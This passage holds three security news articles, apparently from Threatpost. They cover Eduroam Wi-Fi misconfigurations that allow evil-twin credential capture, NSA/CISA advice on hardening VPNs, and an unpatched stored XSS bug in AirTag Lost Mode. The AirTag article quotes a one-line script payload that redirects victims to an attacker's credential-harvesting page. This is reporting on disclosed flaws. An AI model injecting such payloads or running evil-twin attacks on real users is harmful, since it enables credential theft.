        "text": "Certificate misconfigurations of the EAP protocol in Eduroam (and likely other networks globally) threaten Android and Windows users.\nMultiple configuration flaws in a free Wi-Fi network used by numerous universities can allow access to usernames and passwords of students and faculty who connect to the system from Android and Windows devices, researchers have found.\nA research team from WizCase, led by researcher Ata Hakçıl, reviewed 3,100 configurations of Eduroam at universities throughout Europe, finding that more than half of them have issues that can be exploited by threat actors. The misconfiguration danger could extend to other organizations globally as well, they added.\nEduroam provides free Wi-Fi connections at participating institutions. It assigns students, researchers and faculty members log-in credentials that allow them to obtain internet connectivity across different institutions by using credentials from their own university.\nSpecifically, researchers discovered flaws in the implementation of the Extensible Authentication Protocol (EAP) that Eduroam uses, which provides different stages of authentication as people connect to the network. Some of those authentication phases aren’t configured properly in some universities, opening security holes, they said.\n“Any students or faculty members using Eduroam or similar EAP-based Wi-Fi networks in their faculties with the wrong configuration are at risk,” researchers wrote in a report posted Wednesday. “If you are using an Android device and have Eduroam Wi-Fi set to auto-connect, malicious people could capture your plaintext username and password by only getting 20 or so meters in range of you.”\nNetwork ‘Evil Twin’\nFor the research, WizCase examined various configuration-setup guides and set up a test environment with different attack scenarios. Overall, their findings showed that in most of the universities with misconfigured networks, threat actors can configure an “evil twin” Eduroam network that a user would think was the real network, particularly on Android devices.\n“This could result in these devices automatically sending their stored credentials in order to connect to the evil twin Wi-Fi network for users not using eduroamCAT,” which is Eduroam’s catalog application which handles certificate checks, they wrote.\nResearchers stressed that the problem is not the fault of any technical vulnerability from Eduroam’s services or technology, but from erroneous configuration instructions that the universities’ own network administrators provide to those setting up access, they said.\nIndeed, while each institution provides resources and people to help keep Eduroam running, there is no centralized management for the network — either as a whole or at each university where the system is in place, researchers observed. This means that “a simple misconfiguration could make it the target of hackers,” they said.\nResearchers further pinpointed the problem by breaking down the multiple sequential phases of EAP authentication, finding that poor implementation of the last stage of this authentication, called “Inner Authentication,” is the root of the issue.\nIn EAP, Inner Authentication is done in one of two ways. One way is to use Plain Authentication Protocol (PAP), which transfers the credentials of the users to the authentication server in plaintext, relying on the Outer Authentication to completely encrypt the traffic using a server certificate.\nThe other way uses Microsoft Challenge Handshake Authentication Protocol version 2 (MSCHAPv2, which recognizes there may be failures in the “Outer Authentication” stage, and transfers the password in a hashed, non-plaintext form, researchers said.\nThe vulnerable universities use the former.\nBotched Certificate Checks\nThe problem lies in that not every OS implements the certificate check to secure the connection properly—Android being among those OSes, researchers wrote.\n“When a network with the same Wi-Fi name appears, Android devices will not check whether this certificate is trustworthy or not, and will not even notify the user about the certificate before connecting,” they explained.\nThis means if an Android user has enabled auto-connect for a network using a server certificate, Android devices will automatically attempt to connect to this network and send stored credentials, and the user is none the wiser, researchers said.\nEven an OS that implements certificate checks properly can expose data because often a user doesn’t know what a certificate check means, and so will allow the connection to continue even if they are receive an alert about the certificate, they added. This means that the issue can occur on Windows as well if a system is misconfigured, researchers said.\nHowever, iOS devices aren’t vulnerable to the issue because they don’t allow connections to EAP networks without installing the EAP configuration file, which enforces the validity of the server-side certificate, researchers said.\nOf the 3,100 Euroam participating university configurations reviewed by WizCase, 2,100 scattered across Europe are potentially affected by the problem, researchers said. It could be mitigated by reverting to the second method of Inner Authentication, according to the firm.\nWizCase contacted Eduroam in December to disclose their findings, receiving a response on the same day, researchers said. Eduroam representatives said they are aware of “Eduroam identity providers who do not follow the requirements of the Eduroam policy, and leave their own users unprotected,” agreeing with researchers’ assessment that this behavior is “unacceptable,” according to WizCase. It’s unclear if Eduroam contacted its customers to alert them to the issue.\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nBreach\nMobile Security\nVulnerabilities\nWeb Security"
    },
    {
        "title": "Keep Attackers Out of VPNs: Feds Offer Guidance",
        "author": "Lisa Vaas",
        "date": "September 29, 2021 7:10 pm",
        "text": "The NSA and CISA issued recommendations on choosing and hardening VPNs to prevent nation-state APTs from weaponizing flaws & CVEs to break into protected networks.\nUnsecured VPNs can be a hot mess: Just ask Colonial Pipeline (which got pwned by the REvil ransomware crooks with an old VPN password) or the 87,000 (at least) Fortinet customers whose credentials for unpatched SSL-VPNs were posted online earlier this month.\nVulnerabilities in VPN servers are like welcome mats to nation-state advanced persistent threat (APT) actors. Often, they weaponize VPN vulnerabilities to break into protected networks.\nBut this week, as they have repeatedly attempted in the past, the Feds moved to whisk away that mat.\nOn Tuesday, the National Security Agency (NSA) and the Cybersecurity and Infrastructure Security Agency (CISA) issued guidance on selecting and hardening VPNs. The guidance will hopefully help U.S. military leaders to better understand the risks associated with these devices.\nWhat’s at Stake\nAs the advisory from the NSA and CISA explained, exploiting CVEs associated with VPNs can enable a malicious actor “to steal credentials, remotely execute code, weaken encrypted traffic’s cryptography, hijack encrypted traffic sessions and read sensitive data from the device.”\nThe guidance continued: “If successful, these effects usually lead to further malicious access and could result in a large-scale compromise to the corporate network.”\nA recent example of nation-state actors preying on vulnerable VPNs came in May, when Pulse Secure rushed a fix for a critical zero-day security vulnerability in its Connect Secure VPN devices. The zero day was exploited by two APTs, likely linked to China, who used it to launch cyberattacks against U.S. defense, finance and government targets, as well as victims in Europe.\nHow to Choose and Harden a VPN\nThere’s clearly still work to be done to harden VPN defenses.\nTo that end, the federal agencies released an information sheet (PDF) that details what to take into account when selecting a remote access VPN, as well as how to harden these devices from compromise.\nOne of the recommendations: use tested and validated VPN products listed on the National Information Assurance Partnership (NIAP) Product Compliant List that employ strong authentication methods like multi-factor authentication (MFA).\nOther tips:\nConfigure strong cryptography and authentication\nRun only strictly necessary features\nProtect and monitor access to and from the VPN\nThe feds also recommend moving to a zero-trust paradigm (more on that below). And many researchers are also pushing a move away from VPNs entirely.\nThis Is So Old School\nVPNs are common fixtures in the perimeter landscape, but some say that should change.\nArchie Agarwal, founder and CEO of ThreatModeler, pointed out that a quick search with Shodan – the search engine for internet-connected devices – uncovers more than a million VPNs on the internet in the U.S. alone.\n“These are the doorways to private, sensitive internal networks and are sitting there exposed to the world for any miscreant to try to break through,” he told Threatpost via email on Wednesday.\nAll of those sitting VPN ducks represent “the old perimeter security paradigm,” Agarwal said, and they’ve “failed to protect the inner castle over and again.” If credentials are leaked or stolen, or new vulnerabilities are (inevitably) discovered, “the game is lost and the castle falls,” he commented.\nBetter for organizations to use the zero-trust approach being advocated by the U.S. government and NIST, Agarwal suggested. Zero trust, an approach that pivots from a “trust but verify” to a “never trust/always verify” approach, slams shut those public doorways into the network and “throws an invisible cloak over the entire network,” he said.\nIn May, the White House issued an executive order mandating that the federal government move toward a zero-trust architecture: A mandate that’s trickier to implement than may first appear. So, earlier this month, the Biden administration offered further guidance on how to implement it.\nVPNs: Here to Stay or Headed to the Dust Bin?\nWill the push to zero trust spell doomsday for VPNs? Agarwal thinks so: He pointed to startups that are pioneering the architecture and predicted that “the days of VPNs on the internet are thankfully numbered.”\nBut there are those who would beg to differ.\nHeather Paunet, senior vice president at SMB network security provider Untangle, noted that while the concept of zero trust is clear, the term has been interpreted differently “by both those trying to implement it and vendors moving fast to be able to state that they provide it.”\nShe told Threatpost via email on Wednesday that zero trust “can incorporate VPN technologies,” and that the NSA’s guidelines on selecting and hardening VPN standards “clearly show that it’s important to look carefully at selecting which VPN technology to use.”\nShe added, “Vendors that don’t fully research VPN technologies can end up with a solution that is less likely to stand up to an attack.”\nPaunet painted a pro-VPN future: “While there has been a rise in vulnerabilities of VPNs due to more VPN usage over the last year and a half, newer VPN technologies with newer types of cryptography are evolving to ensure the protection of information transmitted across the internet.”\nDon’t Forget the Human Element\nUntangle’s Paunet sees a missing piece of the guidance: namely, humans. Besides following strict guidelines, IT professionals are also challenged with getting employees to effectively use the technology, she noted: “If the VPN is too difficult to use, or slows down systems, the employee is likely to turn it off.”\nPaunet also said that that VPN technologies “have come a long way over the last two to three years, with newer technologies … providing fast connections that are easy to set up by administrators and simple to use by employees.”\nThe challenge then for IT professionals is to find a VPN solution that fits the guidelines, but “is also fast and reliable so that employees turn it on once and forget about it,” she said.\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nGovernment\nVulnerabilities\nWeb Security"
    },
    {
        "title": "Apple AirTag Zero-Day Weaponizes Trackers",
        "author": "Tara Seals",
        "date": "September 29, 2021 4:48 pm",
        "text": "Apple’s personal item-tracker devices can be used to deliver malware, slurp credentials, steal tokens and more thanks to XSS.\nAn unpatched stored cross-site scripting (XSS) bug in Apple’s AirTag “Lost Mode” could open up users to a cornucopia of web-based attacks, including credential-harvesting, click-jacking, malware delivery, token theft and more.\nThat’s according to Bobby Rauch, an independent security researcher who said that it’s possible to use the zero-day to fully weaponize an AirTag, with the ability to attack random strangers (or specific targets) should they interact with it.\nStored XSS, also known as persistent XSS, occurs when a malicious script is injected directly into a vulnerable web application. An attack then only requires that a victim visit a compromised web page.\nA word about how AirTags work: Apple’s AirTags are personal tracking devices that can be attached to keys, backpacks and other items. If an AirTagged item is lost and nearby, a user can “ping” the AirTag, which will emit a sound and allow it to be tracked down. If it’s further afield (left behind in a restaurant, etc.), the AirTag sends out a secure Bluetooth signal that can be detected by nearby devices in Apple’s Find My network (which has had its own issues in the past). These devices send the location of the AirTag to iCloud — and the user can open the Find My app and see the lost item on a map.\nThe Lost Mode function goes hand in hand with the further-afield function. If an AirTag doesn’t show up in the Find My app, a user can mark the AirTag as missing, and will get an alert if it’s later picked up by the Find My network.\nBut the problematic part of Lost Mode has to do with a different perk: If a stranger finds an AirTag in Lost Mode and scans it via near-field communication (NFC), it generates a unique https://found.apple.com page, which contains its serial number, phone number and a personal message for anyone discovering it. The idea is to let people “turn in” missing items to their rightful owners.\nThe issue, according to Rauch, is that these pages don’t have protection for stored XSS – so, an attacker can inject a malicious payload into the AirTag using the Lost Mode phone number field.\nIn one attack scenario, cybercriminals can use XSS code to redirect victims to the attacker’s fake iCloud page, which has a keylogger installed to capture their credentials.\n“A victim will believe they are being asked to sign into iCloud so they can get in contact with the owner of the AirTag, when in fact, the attacker has redirected them to a credential-hijacking page,” Rauch said in a Tuesday posting. “”Since AirTags were recently released, most users would be unaware that accessing the https://found.apple.com page doesn’t require authentication at all.”\nHe added, “An attacker can create weaponized AirTags and leave them around, victimizing innocent people who are simply trying to help a person find their lost AirTag.”\nRauch provided an example malicious payload to be entered into the phone number field: “<script>window.location=’https://10.0.1.137:8000/indexer.html’;var a = ”;</script>”. He also noted that AirTags could be weaponized to carry out all sorts of attacks.\n“[This is] only one example of the dangers of stored XSS,” he wrote. “There are countless ways an attacker could victimize an end user who discovers a lost AirTag…The https://found.apple.com link can also be used as a phishing link, and shared via a desktop/laptop, without the need for a mobile device to scan the AirTag. Further injection attacks could occur through the Find My App, which is used to scan third-party devices that support ‘Lost Mode’ as part of Apple’s Find My network.”\nThe bug has yet to be patched, although Rauch told security journalist Brian Krebs that he reported it to Apple on June 20. Last week, the company told him that it was planning to patch “in an upcoming update.”\nAbsent a timeline for a fix or any response to his multiple questions about credit and acknowledgement, Rauch told Krebs he decided to go public.\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nIoT\nMalware\nVulnerabilities\nWeb Security"
    }
]